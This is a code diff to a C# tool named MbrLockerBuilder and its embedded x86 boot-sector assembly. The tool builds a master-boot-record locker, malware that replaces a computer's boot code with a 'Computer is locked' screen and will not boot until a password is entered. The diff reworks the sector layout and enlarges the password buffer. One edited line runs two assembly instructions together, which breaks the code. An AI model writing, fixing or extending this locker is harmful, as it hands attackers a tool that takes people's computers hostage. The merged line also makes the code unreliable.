@@ -445,15 +445,18 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                int totalSectors = 16;
+                // НОВАЯ СТРУКТУРА: 10 секторов (0-9)
+                int totalSectors = 10;
                 byte[] fullImage = new byte[512 * totalSectors];
 
+                // 1. MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
+                // 2. Шрифт (сектора 3-4) — 2 сектора = 1024 байта
                 byte[] fontData = GenerateCP866Font();
-                if (fontData != null && fontData.Length >= 4096)
+                if (fontData != null && fontData.Length >= 1024)
                 {
-                    Array.Copy(fontData, 0, fullImage, 512 * 3, 4096);
+                    Array.Copy(fontData, 0, fullImage, 512 * 3, 1024);
                 }
                 else
                 {
@@ -461,6 +464,7 @@ namespace MbrLockerBuilder
                     return;
                 }
 
+                // 3. Заголовок (сектор 5)
                 string title = this.txtTitle.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
                 string border = "========================================\r\n";
@@ -468,15 +472,16 @@ namespace MbrLockerBuilder
                 string titleText = border + formattedTitle + border + "\r\n\0";
                 byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 5, titleBytes.Length);
 
+                // 4. Текст (сектор 6)
                 string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
                 string formattedBody = body.Replace("\n", "\r\n");
                 string bodyText = formattedBody + "\0";
                 byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
                 if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 6, bodyBytes.Length);
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -626,7 +631,7 @@ start:
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 8
+    mov al, 2
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -644,7 +649,7 @@ start:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 11
+    mov cl, 5
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -659,7 +664,7 @@ start:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 12
+    mov cl, 6
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -671,8 +676,7 @@ start:
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
-    mov dl, 0
-    int 0x10
+    mov dl, 0    int 0x10
 
     mov si, msg_prompt
     call print
@@ -683,24 +687,9 @@ password_loop:
     cmp byte [password_ok], 1
     je restore_and_boot
     
-    ; СТИРАЕМ СТАРУЮ НАДПИСЬ (без clear_line)
-    mov ah, 0x02
-    mov bh, 0
-    mov dh, 25
-    mov dl, 0
-    int 0x10
-    
-    mov cx, 20
-    mov al, ' '
-.clear_loop:
-    int 0x10
-    loop .clear_loop
-    
-    ; ВЫВОДИМ НОВУЮ WRONG PASSWORD!
     mov si, msg_wrong
     call print
-    
-    ; ВОЗВРАЩАЕМ КУРСОР НА ПАРОЛЬ
+
     mov ah, 0x02
     mov bh, 0
     mov dh, 24
@@ -773,7 +762,7 @@ print:
 
 get_password:
     mov di, buffer
-    mov cx, 32
+    mov cx, 64
 .loop:
     xor ax, ax
     int 0x16
@@ -783,7 +772,7 @@ get_password:
     je .backspace
     cmp al, 0x7F
     je .backspace
-    cmp di, buffer + 32
+    cmp di, buffer + 64
     je .loop
     stosb
     mov ah, 0x0E
@@ -850,7 +839,7 @@ password:
     db {PASSWORD_HEX}
 
 buffer:
-    times 32 db 0
+    times 64 db 0
 password_ok:
     db 0
 
